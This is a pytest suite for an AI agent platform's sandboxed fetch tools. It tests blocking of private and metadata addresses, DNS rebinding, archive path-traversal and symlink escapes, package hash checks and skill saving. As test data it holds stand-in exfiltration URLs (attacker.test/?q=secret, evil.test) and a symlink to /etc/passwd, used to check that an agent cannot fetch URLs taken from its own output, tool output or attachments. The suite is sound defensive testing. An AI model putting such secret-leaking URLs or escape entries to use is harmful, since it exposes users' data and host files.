"""Public fetches for the sandbox: address checks, provenance, budgets, archives, packages and saved skills."""

from __future__ import annotations

import asyncio
import io
import ipaddress
import json
import socket
import subprocess
import sys
import tarfile
import threading
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import httpcore
import pytest
from fastapi.testclient import TestClient

from ailab_platform import web
from ailab_platform.agent import net_tools, tools
from ailab_platform.api.main import app
from ailab_platform.config import settings
from ailab_platform.storage import get_storage
from ailab_platform.worker.pipeline import process_file

from .run_claims import attempt_headers, owned_headers
from .test_modes_skills_attachments import _ApiClient
from .test_skill_settings import _user

# ---- addresses ----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "address",
    [
        "127.0.0.1",
        "10.1.2.3",
        "169.254.169.254",  # cloud metadata
        "100.100.1.1",  # CGNAT / Tailscale
        "0.0.0.0",
        "::1",
        "fd00::1",
        "::ffff:127.0.0.1",  # IPv4-mapped
        "64:ff9b::a9fe:a9fe",  # NAT64 of 169.254.169.254: is_global alone says True
        "2002:7f00:1::1",  # 6to4 of 127.0.0.1
        "2001:0:4136:e378:8000:63bf:f5ff:fffe",  # Teredo
        "224.0.0.1",
    ],
)
def test_non_public_and_embedding_addresses_are_refused(address) -> None:
    assert not web.is_public(ipaddress.ip_address(address))


def test_public_addresses_pass() -> None:
    assert web.is_public(ipaddress.ip_address("93.184.216.34"))
    assert web.is_public(ipaddress.ip_address("2606:2800:220:1:248:1893:25c8:1946"))
    assert web.is_public(ipaddress.ip_address("64:ff9b::5db8:d822"))  # NAT64 of a public address


def _answers(monkeypatch, mapping: dict[str, list[str]]) -> list[str]:
    asked: list[str] = []

    def fake(host, port, *args, **kwargs):
        asked.append(host)
        if host in mapping:
            return [(socket.AF_INET6 if ":" in a else socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port)) for a in mapping[host]]
        raise socket.gaierror("unknown")

    monkeypatch.setattr(web.socket, "getaddrinfo", fake)
    return asked


def test_a_mixed_dns_answer_is_refused(monkeypatch) -> None:
    _answers(monkeypatch, {"mixed.test": ["93.184.216.34", "10.0.0.5"]})
    with pytest.raises(web.WebError, match="non-public"):
        asyncio.run(web.public_addresses("mixed.test", 443))


def test_the_connection_uses_the_address_that_was_checked(monkeypatch) -> None:
    """DNS rebinding: whatever a second lookup would say, the socket goes to the checked address only."""
    _answers(monkeypatch, {"rebind.test": ["93.184.216.34"]})
    dialed: list[str] = []

    async def fake_connect(self, host, port, *args, **kwargs):
        dialed.append(host)
        raise httpcore.ConnectError("stop here")

    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", fake_connect)
    with pytest.raises(web.WebError):
        asyncio.run(web.read_url("https://rebind.test/x"))
    assert dialed == ["93.184.216.34"]


def test_a_host_resolving_inside_is_refused_before_connecting(monkeypatch) -> None:
    _answers(monkeypatch, {"inside.test": ["127.0.0.1"]})
    dialed: list[str] = []

    async def fake_connect(self, host, port, *args, **kwargs):
        dialed.append(host)

    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", fake_connect)
    with pytest.raises(web.WebError, match="non-public"):
        asyncio.run(web.read_url("http://inside.test/"))
    assert dialed == []


# ---- a local stand-in for the public internet ---------------------------------------------------


class _Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):
        if self.path == "/to-metadata":
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.end_headers()
        elif self.path == "/to-inside":
            self.send_response(302)
            self.send_header("Location", "http://inside.test/")
            self.end_headers()
        elif self.path == "/page":
            body = b'<html><title>T</title><a href="/next">n</a><a href="https://other.test/x#f">o</a><p>hello</p></html>'
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/declared-big":
            self.send_response(200)
            self.send_header("Content-Length", str(10 * 1024 * 1024))
            self.end_headers()
        elif self.path == "/chunked-big":
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()  # no length: the client must count
            for _ in range(64):
                self.wfile.write(b"x" * 65536)
        elif self.path == "/file.png":
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", "4")
            self.end_headers()
            self.wfile.write(b"\x89PNG")
        else:
            self.send_response(404)
            self.end_headers()


@pytest.fixture()
def internet(monkeypatch):
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    port = server.server_address[1]
    real_check = web.public_addresses

    async def addresses(host, p):
        if host == "public.test":  # pretend the loopback test server is a public host
            return ["127.0.0.1"]
        return await real_check(host, p)

    original = httpcore.AnyIOBackend.connect_tcp

    async def connect(self, host, p, *args, **kwargs):
        return await original(self, host, port if host == "127.0.0.1" else p, *args, **kwargs)

    monkeypatch.setattr(web, "public_addresses", addresses)
    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", connect)
    _answers(monkeypatch, {"inside.test": ["10.0.0.7"]})
    yield
    server.shutdown()


def test_redirects_into_metadata_or_inside_hosts_are_refused(internet) -> None:
    with pytest.raises(web.WebError, match="non-public"):
        asyncio.run(web.read_url("http://public.test/to-metadata"))
    with pytest.raises(web.WebError, match="non-public"):
        asyncio.run(web.read_url("http://public.test/to-inside"))


def test_read_url_returns_absolute_links(internet) -> None:
    page = asyncio.run(web.read_url("http://public.test/page"))
    assert "hello" in page["text"] and page["links"] == ["http://public.test/next", "https://other.test/x"]


def test_downloads_stop_at_the_limit_and_leave_nothing_behind(internet, monkeypatch) -> None:
    async def fetch(url):
        async with web.download(url, 1024 * 1024) as got:
            return got

    with pytest.raises(web.WebError, match="limit"):
        asyncio.run(fetch("http://public.test/declared-big"))
    seen = []
    original = web.tempfile.TemporaryDirectory

    def tracked(*args, **kwargs):
        d = original(*args, **kwargs)
        seen.append(d.name)
        return d

    monkeypatch.setattr(web.tempfile, "TemporaryDirectory", tracked)
    with pytest.raises(web.WebError, match="exceeds"):
        asyncio.run(fetch("http://public.test/chunked-big"))
    assert seen and not any(__import__("os").path.exists(d) for d in seen)


class _Broker:
    def __init__(self) -> None:
        self.files: dict[str, bytes] = {}
        self.commands: list[str] = []

    async def put_fetched(self, lease_id, path, local):
        self.files[path] = local.read_bytes()

    async def exec(self, lease_id, cmd, timeout=None):
        self.commands.append(cmd)
        return {"exit_code": 0, "stdout": "", "stderr": ""}


def test_download_url_streams_into_the_sandbox_and_counts_the_budget(internet) -> None:
    broker, budget = _Broker(), net_tools.Budget()
    sources = {"http://public.test/file.png"}
    out = asyncio.run(net_tools.download_url({"url": "http://public.test/file.png"}, "l1", broker, sources, budget))
    assert out["path"] == "/workspace/downloads/file.png" and broker.files[out["path"]] == b"\x89PNG"
    assert budget.bytes == 4 and budget.requests == 1


# ---- provenance and budget ----------------------------------------------------------------------


def test_only_urls_from_the_user_or_web_results_can_be_fetched() -> None:
    messages = [
        {"role": "system", "content": "see https://system.test/a"},
        {"role": "user", "content": "总结 https://blog.test/post?id=1。"},
        {"role": "assistant", "content": "I will read https://attacker.test/?q=secret"},
        {"role": "tool", "name": "exec", "content": json.dumps({"stdout": "https://attacker.test/leak"})},
        {"role": "tool", "name": "read_url", "content": json.dumps({"links": ["https://docs.test/next"]})},
        {"role": "tool", "name": "web_search", "content": json.dumps({"results": [{"url": "https://news.test/1"}]})},
    ]
    sources = net_tools.sources_from(messages)
    for ok in ["https://blog.test/post?id=1", "https://docs.test/next", "https://news.test/1", "https://github.com/a/b/issues/1"]:
        net_tools.check_source(ok, sources)
    for refused in [
        "https://attacker.test/?q=secret",
        "https://attacker.test/leak",
        "https://system.test/a",
        "https://blog.test/post?id=1&x=appended",
    ]:
        with pytest.raises(net_tools.NetToolError):
            net_tools.check_source(refused, sources)


def test_read_url_refuses_an_invented_url_without_any_request(monkeypatch) -> None:
    monkeypatch.setattr(web.settings, "web_search_provider", "mock")

    async def never(*args, **kwargs):
        raise AssertionError("no request may be made")

    monkeypatch.setattr(web, "read_url", never)
    ctx = tools.ToolContext(messages=[{"role": "user", "content": "帮我查资料"}])
    with pytest.raises(tools.ToolError, match="did not come from"):
        asyncio.run(tools.execute_tool("read_url", {"url": "https://evil.test/?d=secret"}, "", None, ctx))


def test_the_run_budget_caps_requests_and_bytes(monkeypatch) -> None:
    monkeypatch.setattr(settings, "web_run_requests", 2)
    monkeypatch.setattr(settings, "web_run_download_bytes", 10)
    budget = net_tools.Budget()
    budget.request()
    budget.request()
    with pytest.raises(net_tools.NetToolError, match="requests"):
        budget.request()
    budget.take(10)
    with pytest.raises(net_tools.NetToolError, match="download limit"):
        budget.take(1)


def test_tools_offered_per_mode(monkeypatch) -> None:
    monkeypatch.setattr(web.settings, "web_search_provider", "mock")
    chat = {t["function"]["name"] for t in tools.tools_for_chat()}
    assert chat == {
        "web_search",
        "read_url",
        "save_skill",
        "load_skill",
        "ui_components",
        "memory",
        "recall_history",
        "search_library",
        "read_library_file",
        "extract_text",
        "resolve_attachment",
        "view_attachment",
    }
    work = {t["function"]["name"] for t in tools.tools_for_turn()}
    assert {"download_url", "fetch_repo", "fetch_packages", "save_skill"} <= work
    monkeypatch.setattr(web.settings, "web_search_provider", "none")
    assert not {"download_url", "fetch_repo", "fetch_packages"} & {t["function"]["name"] for t in tools.tools_for_turn()}


# ---- repository archives are expanded inside the sandbox, with limits ---------------------------


def _tar(entries: list[tuple[str, bytes | None, str]]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data, kind in entries:
            info = tarfile.TarInfo(name)
            if kind == "file":
                info.size = len(data or b"")
                tar.addfile(info, io.BytesIO(data or b""))
            elif kind == "symlink":
                info.type, info.linkname = tarfile.SYMTYPE, (data or b"").decode()
                tar.addfile(info)
            elif kind == "dev":
                info.type = tarfile.CHRTYPE
                tar.addfile(info)
    return buf.getvalue()


def _extract(tmp_path, data: bytes, max_files=100, max_bytes=10_000):
    archive = tmp_path / f"{uuid.uuid4().hex}.tar.gz"
    archive.write_bytes(data)
    dest = tmp_path / uuid.uuid4().hex
    cmd = [sys.executable, "-I", "-c", net_tools.EXTRACT, str(archive), str(dest), str(max_files), str(max_bytes)]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=30), dest


def test_a_repository_archive_is_extracted_without_its_top_folder(tmp_path) -> None:
    result, dest = _extract(tmp_path, _tar([("o-r-123/README.md", b"hi", "file"), ("o-r-123/src/a.py", b"x=1", "file")]))
    assert result.returncode == 0, result.stderr
    assert (dest / "README.md").read_bytes() == b"hi" and (dest / "src/a.py").exists()


@pytest.mark.parametrize(
    "entries",
    [
        [("o-r/../../escape.txt", b"x", "file")],
        [("o-r/link", b"/etc/passwd", "symlink"), ("o-r/link/x", b"y", "file")],
        [("o-r/up", b"../../..", "symlink")],
    ],
)
def test_archive_entries_leaving_the_tree_are_refused(tmp_path, entries) -> None:
    result, dest = _extract(tmp_path, _tar(entries))
    assert result.returncode != 0
    assert not (tmp_path / "escape.txt").exists() and not dest.exists()
    assert list(tmp_path.iterdir()) == []  # neither the partial tree nor the archive is left behind


def test_absolute_names_land_inside_the_destination(tmp_path) -> None:
    result, dest = _extract(tmp_path, _tar([("o-r//etc/passwd", b"x", "file")]))
    assert result.returncode == 0 and (dest / "etc/passwd").read_bytes() == b"x"


def test_devices_are_skipped_and_expansion_limits_hold(tmp_path) -> None:
    result, dest = _extract(tmp_path, _tar([("o-r/dev", None, "dev"), ("o-r/a", b"1", "file")]))
    assert result.returncode == 0 and not (dest / "dev").exists() and (dest / "a").exists()
    many = [(f"o-r/f{i}", b"x", "file") for i in range(20)]
    result, dest = _extract(tmp_path, _tar(many), max_files=10)
    assert result.returncode == 3 and "expands past" in result.stdout and not dest.exists()
    big = [("o-r/big", b"x" * 5000, "file"), ("o-r/big2", b"x" * 6000, "file")]
    result, dest = _extract(tmp_path, _tar(big), max_bytes=10_000)
    assert result.returncode == 3 and not dest.exists()


# ---- package resolution uses PyPI metadata only, and the sandbox's own tags ---------------------

ENV = {"py": [3, 12, 4], "machine": "aarch64", "glibc": "2.36", "installed": {"six": "1.16.0"}}


def _pypi(monkeypatch, projects: dict[str, dict[str, dict]]):
    async def get_json(url, max_bytes, headers=None):
        if "/simple/" in url:
            name = url.rstrip("/").split("/")[-1]
            return {"versions": list(projects[name])}
        name, version = url.split("/pypi/")[1].split("/")[:2]
        return projects[name][version]

    monkeypatch.setattr(web, "get_json", get_json)


def _release(files: list[str], requires: list[str] | None = None) -> dict:
    return {
        "urls": [{"filename": f, "url": f"https://files.pythonhosted.org/x/{f}", "digests": {"sha256": "0" * 64}} for f in files],
        "info": {"requires_dist": requires},
    }


def test_resolution_picks_compatible_files_and_follows_dependencies(monkeypatch) -> None:
    _pypi(
        monkeypatch,
        {
            "demo": {
                "2.0": _release(["demo-2.0-cp312-cp312-manylinux_2_28_x86_64.whl"]),  # wrong arch only
                "1.5": _release(
                    ["demo-1.5-cp312-cp312-manylinux_2_28_aarch64.whl", "demo-1.5.tar.gz"],
                    ["dep>=1", "six", "winonly; sys_platform == 'win32'", "extra-dep; extra == 'fast'"],
                ),
            },
            "dep": {"1.0": _release(["dep-1.0-py3-none-any.whl"]), "0.9": _release(["dep-0.9-py3-none-any.whl"])},
            "extra-dep": {"1.0": _release(["extra_dep-1.0.tar.gz"])},
        },
    )
    plan = asyncio.run(net_tools.resolve(["demo"], ENV, net_tools.Budget()))
    assert {(p["name"], p["version"], p["file"]["filename"]) for p in plan} == {
        ("demo", "1.5", "demo-1.5-cp312-cp312-manylinux_2_28_aarch64.whl"),
        ("dep", "1.0", "dep-1.0-py3-none-any.whl"),
    }  # six is installed; the win32 and extra-only dependencies are not wanted here
    with_extra = asyncio.run(net_tools.resolve(["demo[fast]"], ENV, net_tools.Budget()))
    assert "extra-dep" in {p["name"] for p in with_extra}


def test_conflicts_and_missing_files_are_reported(monkeypatch) -> None:
    _pypi(
        monkeypatch,
        {
            "a": {"1.0": _release(["a-1.0-py3-none-any.whl"], ["c<1"])},
            "b": {"1.0": _release(["b-1.0-py3-none-any.whl"], ["c>=2"])},
            "c": {"2.0": _release(["c-2.0-py3-none-any.whl"]), "0.5": _release(["c-0.5-py3-none-any.whl"])},
            "winpkg": {"1.0": _release(["winpkg-1.0-cp312-cp312-win_amd64.whl"])},
        },
    )
    with pytest.raises(net_tools.NetToolError, match="conflict"):
        asyncio.run(net_tools.resolve(["a", "b"], ENV, net_tools.Budget()))
    with pytest.raises(net_tools.NetToolError, match="has a file"):
        asyncio.run(net_tools.resolve(["winpkg"], ENV, net_tools.Budget()))
    with pytest.raises(net_tools.NetToolError, match="direct URL"):
        asyncio.run(net_tools.resolve(["x @ https://evil.test/x.whl"], ENV, net_tools.Budget()))


def test_a_package_whose_hash_differs_from_pypi_is_removed(monkeypatch) -> None:
    _pypi(monkeypatch, {"tiny": {"1.0": _release(["tiny-1.0-py3-none-any.whl"])}})
    broker = _Broker()

    async def exec_(lease_id, cmd, timeout=None):
        broker.commands.append(cmd)
        return {"exit_code": 0, "stdout": json.dumps(ENV), "stderr": ""}

    async def fetch(_broker, lease_id, url, path, directory, budget):
        return {"path": path, "size": 3, "sha256": "f" * 64, "url": url, "content_type": "application/zip"}

    broker.exec = exec_
    monkeypatch.setattr(net_tools, "_fetch_into", fetch)
    with pytest.raises(net_tools.NetToolError, match="sha256"):
        asyncio.run(net_tools.fetch_packages({"packages": ["tiny"]}, "l1", broker, net_tools.Budget()))
    assert any(c.startswith("rm -f") for c in broker.commands) and not any("pip install" in c for c in broker.commands)


# ---- saving personal skills through a run --------------------------------------------------------

SKILL_MD = "---\nname: {name}\ntitle: 研究助手\ndescription: 总结仓库\n---\n# 步骤\n读 README。\n"


def _running(c, headers) -> str:
    run = c.post("/v1/runs", headers=headers, json={"prompt": "保存技能"}).json()
    c.post(f"/internal/runs/{run['id']}/transition", headers=owned_headers(c, run["id"]), json={"status": "running"})
    return run["id"]


def _save(c, run_id, name, mode, data, delivery=None, expected_file_id=None):
    headers = {**attempt_headers(c, run_id), "X-Delivery-Id": f"{run_id}:{delivery or uuid.uuid4().hex}"}
    params = {"name": name, "mode": mode, "filename": f"{name}.md"}
    if expected_file_id:
        params["expected_file_id"] = expected_file_id
    return c.post(f"/internal/runs/{run_id}/skills", headers=headers, params=params, content=data)


def test_a_saved_skill_is_pending_until_scanned_and_create_never_overwrites() -> None:
    name = f"research-{uuid.uuid4().hex[:6]}"
    with TestClient(app) as c:
        me, other = _user(c), _user(c)
        run_id = _running(c, me)
        first = _save(c, run_id, name, "create", SKILL_MD.format(name=name).encode(), "s1")
        assert first.status_code == 201 and first.json()["status"] == "pending"
        assert _save(c, run_id, name, "create", SKILL_MD.format(name=name).encode(), "s1").json() == first.json()  # a retry
        pending = [s for s in c.get("/v1/skills", headers=me).json() if s["scope"] == "personal"]
        assert [s["error"] for s in pending] == ["安全扫描中"]
        assert _save(c, run_id, name, "create", b"x").status_code == 422  # the name is taken, even while pending
        process_file(first.json()["file_id"], platform=_ApiClient(c), storage=get_storage())
        ready = [s for s in c.get("/v1/skills", headers=me).json() if s["scope"] == "personal"]
        assert [(s["name"], s["error"]) for s in ready] == [(name, None)]
        assert [s for s in c.get("/v1/skills", headers=other).json() if s["scope"] == "personal"] == []

        assert _save(c, run_id, name, "update", SKILL_MD.format(name=name).encode()).status_code == 422
        updated = _save(
            c,
            run_id,
            name,
            "update",
            SKILL_MD.format(name=name).replace("读 README", "读源码").encode(),
            expected_file_id=first.json()["file_id"],
        )
        assert updated.status_code == 201 and updated.json()["version"] == first.json()["version"] + 1
        versions = c.get(f"/v1/files/{updated.json()['file_id']}/versions", headers=me)
        assert versions.status_code != 200 or len(versions.json()) >= 2  # the old version stays restorable

        # another user's run cannot update this user's skill: it is not theirs to find
        assert _save(c, _running(c, other), name, "update", SKILL_MD.format(name=name).encode()).status_code == 404


def test_builtin_names_and_mismatched_skill_files_are_refused() -> None:
    with TestClient(app) as c:
        me = _user(c)
        run_id = _running(c, me)
        assert _save(c, run_id, "pptx", "create", SKILL_MD.format(name="pptx").encode()).status_code == 422
        name = f"claim-{uuid.uuid4().hex[:6]}"
        saved = _save(c, run_id, name, "create", SKILL_MD.format(name="someone-else").encode()).json()
        process_file(saved["file_id"], platform=_ApiClient(c), storage=get_storage())
        mine = {s["file_id"]: s for s in c.get("/v1/skills", headers=me).json() if s["scope"] == "personal"}
        assert "不一致" in mine[saved["file_id"]]["error"]


def test_saving_needs_the_scope_and_a_running_run() -> None:
    with TestClient(app) as c:
        me = _user(c)
        run = c.post("/v1/runs", headers=me, json={"prompt": "x"}).json()
        params = {"name": "abc", "mode": "create", "filename": "abc.md"}
        assert c.post(f"/internal/runs/{run['id']}/skills", params=params, content=b"x").status_code in (401, 403)


def test_a_refused_save_is_a_tool_error_and_the_run_continues() -> None:
    """409 on the internal API means a lost attempt; a name conflict must not look like one and crash the run."""
    from ailab_platform.agent.loop import AgentLoop
    from ailab_platform.clients import ClientError
    from ailab_platform.llm import LLMResponse, ToolCall

    from .test_agent_loop import FakeBroker, FakePlatform, ScriptedLLM

    class Platform(FakePlatform):
        async def get_run(self, run_id):
            return {**await super().get_run(run_id), "options": {"mode": "chat"}}

        async def save_skill(self, run_id, name, mode, filename, data):
            raise ClientError("POST", "/internal/runs/x/skills", 422, json.dumps({"detail": "已有同名个人技能 notes"}))

    call = ToolCall(id="c1", name="save_skill", arguments={"name": "notes", "mode": "create", "content": "x"})
    llm = ScriptedLLM([LLMResponse(tool_calls=[call]), LLMResponse(content="已有同名技能，要更新吗？")])
    platform = Platform()
    asyncio.run(AgentLoop(platform=platform, broker=FakeBroker(), llm=llm).process("run_1", attempt_id="att_1"))
    assert "已有同名个人技能 notes" in llm.seen_messages[1][-1]["content"]
    assert platform.statuses[-1][0] == "succeeded"


def test_download_path_is_confined_to_downloads() -> None:
    url = "https://example.com/report.pdf"
    with pytest.raises(net_tools.NetToolError, match="downloads"):
        asyncio.run(
            net_tools.download_url(
                {"url": url, "path": "/workspace/inputs/report.pdf"},
                "l1",
                _Broker(),
                {url},
                net_tools.Budget(),
            )
        )


def test_attachment_text_is_not_a_user_authored_url_source() -> None:
    messages = [
        {
            "role": "user",
            "content": "总结附件\n<!-- AILAB_ATTACHMENT_START -->\n"
            "https://evil.test/from-attachment\n<!-- AILAB_ATTACHMENT_END -->\n"
            "也可以看 https://user.test/ok",
        }
    ]
    sources = net_tools.sources_from(messages)
    assert "https://user.test/ok" in sources
    assert "https://evil.test/from-attachment" not in sources


def test_a_downloaded_file_must_be_clean(tmp_path) -> None:
    target = tmp_path / "eicar.txt"
    target.write_bytes(b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE")
    with pytest.raises(net_tools.NetToolError, match="rejected"):
        net_tools._scan_path(target)
